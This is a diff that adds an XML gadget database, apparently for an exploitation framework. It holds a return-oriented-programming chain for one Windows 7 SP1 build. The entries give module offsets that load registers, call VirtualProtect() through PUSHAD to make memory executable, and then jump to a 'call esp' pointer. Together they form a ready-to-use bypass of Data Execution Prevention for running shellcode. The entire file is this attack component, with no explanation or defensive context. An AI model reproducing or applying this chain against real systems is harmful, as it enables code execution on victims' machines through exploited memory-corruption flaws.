@@ -1,0 +1,95 @@
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<db>
+<rop>
+  <compatibility>
+    <target>7.0.7601.17744</target>
+  </compatibility>
+
+  <gadgets base="0x76fc0000">
+    <gadget offset="0x0005130a">POP EBP # RETN  ** REBASED ** ASLR</gadget>
+    <gadget offset="0x0005130a">skip 4 bytes  ** REBASED ** ASLR</gadget>
+    <gadget offset="0x00031a3a">POP EAX # RETN  ** REBASED ** ASLR</gadget>
+    <gadget value="0x397501ff">put delta into eax (-> put 0x00000201 into ebx)</gadget>
+    <gadget offset="0x00027a6b">ADD EAX,C68B0002 # POP EDI # POP ESI # POP EBX # POP EBP # RETN  ** REBASED ** ASLR</gadget>
+    <gadget value="junk">Filler</gadget>
+    <gadget offset="0x0006d3a5">XCHG EAX,EBX # RETN  ** REBASED ** ASLR</gadget>
+    <gadget offset="0x000114a2">POP EDX # RETN  ** REBASED ** ASLR</gadget>
+    <gadget value="0xffffffff"></gadget>
+    <gadget offset="0x00016fe3">INC EDX # SUB BH,BH # DEC ECX # RETN  ** REBASED ** ASLR</gadget>
+    <gadget offset="0x00016fe3">INC EDX # SUB BH,BH # DEC ECX # RETN  ** REBASED ** ASLR</gadget>
+    <gadget offset="0x00016fe3">INC EDX # SUB BH,BH # DEC ECX # RETN  ** REBASED ** ASLR</gadget>
+    <gadget offset="0x00016fe3">INC EDX # SUB BH,BH # DEC ECX # RETN  ** REBASED ** ASLR</gadget>
+    <gadget offset="0x00016fe3">INC EDX # SUB BH,BH # DEC ECX # RETN  ** REBASED ** ASLR</gadget>
+    <gadget offset="0x00016fe3">INC EDX # SUB BH,BH # DEC ECX # RETN  ** REBASED ** ASLR</gadget>
+    <gadget offset="0x00016fe3">INC EDX # SUB BH,BH # DEC ECX # RETN  ** REBASED ** ASLR</gadget>
+    <gadget offset="0x00016fe3">INC EDX # SUB BH,BH # DEC ECX # RETN  ** REBASED ** ASLR</gadget>
+    <gadget offset="0x00016fe3">INC EDX # SUB BH,BH # DEC ECX # RETN  ** REBASED ** ASLR</gadget>
+    <gadget offset="0x00016fe3">INC EDX # SUB BH,BH # DEC ECX # RETN  ** REBASED ** ASLR</gadget>
+    <gadget offset="0x00016fe3">INC EDX # SUB BH,BH # DEC ECX # RETN  ** REBASED ** ASLR</gadget>
+    <gadget offset="0x00016fe3">INC EDX # SUB BH,BH # DEC ECX # RETN  ** REBASED ** ASLR</gadget>
+    <gadget offset="0x00016fe3">INC EDX # SUB BH,BH # DEC ECX # RETN  ** REBASED ** ASLR</gadget>
+    <gadget offset="0x00016fe3">INC EDX # SUB BH,BH # DEC ECX # RETN  ** REBASED ** ASLR</gadget>
+    <gadget offset="0x00016fe3">INC EDX # SUB BH,BH # DEC ECX # RETN  ** REBASED ** ASLR</gadget>
+    <gadget offset="0x00016fe3">INC EDX # SUB BH,BH # DEC ECX # RETN  ** REBASED ** ASLR</gadget>
+    <gadget offset="0x00016fe3">INC EDX # SUB BH,BH # DEC ECX # RETN  ** REBASED ** ASLR</gadget>
+    <gadget offset="0x00016fe3">INC EDX # SUB BH,BH # DEC ECX # RETN  ** REBASED ** ASLR</gadget>
+    <gadget offset="0x00016fe3">INC EDX # SUB BH,BH # DEC ECX # RETN  ** REBASED ** ASLR</gadget>
+    <gadget offset="0x00016fe3">INC EDX # SUB BH,BH # DEC ECX # RETN  ** REBASED ** ASLR</gadget>
+    <gadget offset="0x00016fe3">INC EDX # SUB BH,BH # DEC ECX # RETN  ** REBASED ** ASLR</gadget>
+    <gadget offset="0x00016fe3">INC EDX # SUB BH,BH # DEC ECX # RETN  ** REBASED ** ASLR</gadget>
+    <gadget offset="0x00016fe3">INC EDX # SUB BH,BH # DEC ECX # RETN  ** REBASED ** ASLR</gadget>
+    <gadget offset="0x00016fe3">INC EDX # SUB BH,BH # DEC ECX # RETN  ** REBASED ** ASLR</gadget>
+    <gadget offset="0x00016fe3">INC EDX # SUB BH,BH # DEC ECX # RETN  ** REBASED ** ASLR</gadget>
+    <gadget offset="0x00016fe3">INC EDX # SUB BH,BH # DEC ECX # RETN  ** REBASED ** ASLR</gadget>
+    <gadget offset="0x00016fe3">INC EDX # SUB BH,BH # DEC ECX # RETN  ** REBASED ** ASLR</gadget>
+    <gadget offset="0x00016fe3">INC EDX # SUB BH,BH # DEC ECX # RETN  ** REBASED ** ASLR</gadget>
+    <gadget offset="0x00016fe3">INC EDX # SUB BH,BH # DEC ECX # RETN  ** REBASED ** ASLR</gadget>
+    <gadget offset="0x00016fe3">INC EDX # SUB BH,BH # DEC ECX # RETN  ** REBASED ** ASLR</gadget>
+    <gadget offset="0x00016fe3">INC EDX # SUB BH,BH # DEC ECX # RETN  ** REBASED ** ASLR</gadget>
+    <gadget offset="0x00016fe3">INC EDX # SUB BH,BH # DEC ECX # RETN  ** REBASED ** ASLR</gadget>
+    <gadget offset="0x00016fe3">INC EDX # SUB BH,BH # DEC ECX # RETN  ** REBASED ** ASLR</gadget>
+    <gadget offset="0x00016fe3">INC EDX # SUB BH,BH # DEC ECX # RETN  ** REBASED ** ASLR</gadget>
+    <gadget offset="0x00016fe3">INC EDX # SUB BH,BH # DEC ECX # RETN  ** REBASED ** ASLR</gadget>
+    <gadget offset="0x00016fe3">INC EDX # SUB BH,BH # DEC ECX # RETN  ** REBASED ** ASLR</gadget>
+    <gadget offset="0x00016fe3">INC EDX # SUB BH,BH # DEC ECX # RETN  ** REBASED ** ASLR</gadget>
+    <gadget offset="0x00016fe3">INC EDX # SUB BH,BH # DEC ECX # RETN  ** REBASED ** ASLR</gadget>
+    <gadget offset="0x00016fe3">INC EDX # SUB BH,BH # DEC ECX # RETN  ** REBASED ** ASLR</gadget>
+    <gadget offset="0x00016fe3">INC EDX # SUB BH,BH # DEC ECX # RETN  ** REBASED ** ASLR</gadget>
+    <gadget offset="0x00016fe3">INC EDX # SUB BH,BH # DEC ECX # RETN  ** REBASED ** ASLR</gadget>
+    <gadget offset="0x00016fe3">INC EDX # SUB BH,BH # DEC ECX # RETN  ** REBASED ** ASLR</gadget>
+    <gadget offset="0x00016fe3">INC EDX # SUB BH,BH # DEC ECX # RETN  ** REBASED ** ASLR</gadget>
+    <gadget offset="0x00016fe3">INC EDX # SUB BH,BH # DEC ECX # RETN  ** REBASED ** ASLR</gadget>
+    <gadget offset="0x00016fe3">INC EDX # SUB BH,BH # DEC ECX # RETN  ** REBASED ** ASLR</gadget>
+    <gadget offset="0x00016fe3">INC EDX # SUB BH,BH # DEC ECX # RETN  ** REBASED ** ASLR</gadget>
+    <gadget offset="0x00016fe3">INC EDX # SUB BH,BH # DEC ECX # RETN  ** REBASED ** ASLR</gadget>
+    <gadget offset="0x00016fe3">INC EDX # SUB BH,BH # DEC ECX # RETN  ** REBASED ** ASLR</gadget>
+    <gadget offset="0x00016fe3">INC EDX # SUB BH,BH # DEC ECX # RETN  ** REBASED ** ASLR</gadget>
+    <gadget offset="0x00016fe3">INC EDX # SUB BH,BH # DEC ECX # RETN  ** REBASED ** ASLR</gadget>
+    <gadget offset="0x00016fe3">INC EDX # SUB BH,BH # DEC ECX # RETN  ** REBASED ** ASLR</gadget>
+    <gadget offset="0x00016fe3">INC EDX # SUB BH,BH # DEC ECX # RETN  ** REBASED ** ASLR</gadget>
+    <gadget offset="0x00016fe3">INC EDX # SUB BH,BH # DEC ECX # RETN  ** REBASED ** ASLR</gadget>
+    <gadget offset="0x00016fe3">INC EDX # SUB BH,BH # DEC ECX # RETN  ** REBASED ** ASLR</gadget>
+    <gadget offset="0x00016fe3">INC EDX # SUB BH,BH # DEC ECX # RETN  ** REBASED ** ASLR</gadget>
+    <gadget offset="0x00016fe3">INC EDX # SUB BH,BH # DEC ECX # RETN  ** REBASED ** ASLR</gadget>
+    <gadget offset="0x00016fe3">INC EDX # SUB BH,BH # DEC ECX # RETN  ** REBASED ** ASLR</gadget>
+    <gadget offset="0x00016fe3">INC EDX # SUB BH,BH # DEC ECX # RETN  ** REBASED ** ASLR</gadget>
+    <gadget offset="0x00016fe3">INC EDX # SUB BH,BH # DEC ECX # RETN  ** REBASED ** ASLR</gadget>
+    <gadget offset="0x00016fe3">INC EDX # SUB BH,BH # DEC ECX # RETN  ** REBASED ** ASLR</gadget>
+    <gadget offset="0x00016fe3">INC EDX # SUB BH,BH # DEC ECX # RETN  ** REBASED ** ASLR</gadget>
+    <gadget offset="0x00016fe3">INC EDX # SUB BH,BH # DEC ECX # RETN  ** REBASED ** ASLR</gadget>
+    <gadget offset="0x00016fe3">INC EDX # SUB BH,BH # DEC ECX # RETN  ** REBASED ** ASLR</gadget>
+    <gadget offset="0x00016fe3">INC EDX # SUB BH,BH # DEC ECX # RETN  ** REBASED ** ASLR</gadget>
+    <gadget offset="0x00016fe3">INC EDX # SUB BH,BH # DEC ECX # RETN  ** REBASED ** ASLR</gadget>
+    <gadget offset="0x0005fdeb">POP ECX # RETN  ** REBASED ** ASLR</gadget>
+    <gadget offset="0x000a6cd8">Writable location  ** REBASED ** ASLR</gadget>
+    <gadget offset="0x00030a77">POP EDI # RETN  ** REBASED ** ASLR</gadget>
+    <gadget offset="0x00009f09">RETN (ROP NOP)  ** REBASED ** ASLR</gadget>
+    <gadget offset="0x0008158e">POP ESI # RETN  ** REBASED ** ASLR</gadget>
+    <gadget offset="0x0000b7bd">JMP [EAX] </gadget>
+    <gadget offset="0x00031a3a">POP EAX # RETN  ** REBASED ** ASLR</gadget>
+    <gadget offset="0x000011b8">ptr to VirtualProtect()  ** REBASED ** ASLR</gadget>
+    <gadget offset="0x00065cfc">PUSHAD # RETN  ** REBASED ** ASLR</gadget>
+    <gadget offset="0x000846fd">ptr to 'call esp'  ** REBASED ** ASLR</gadget>
+  </gadgets>
+</rop>
+</db>
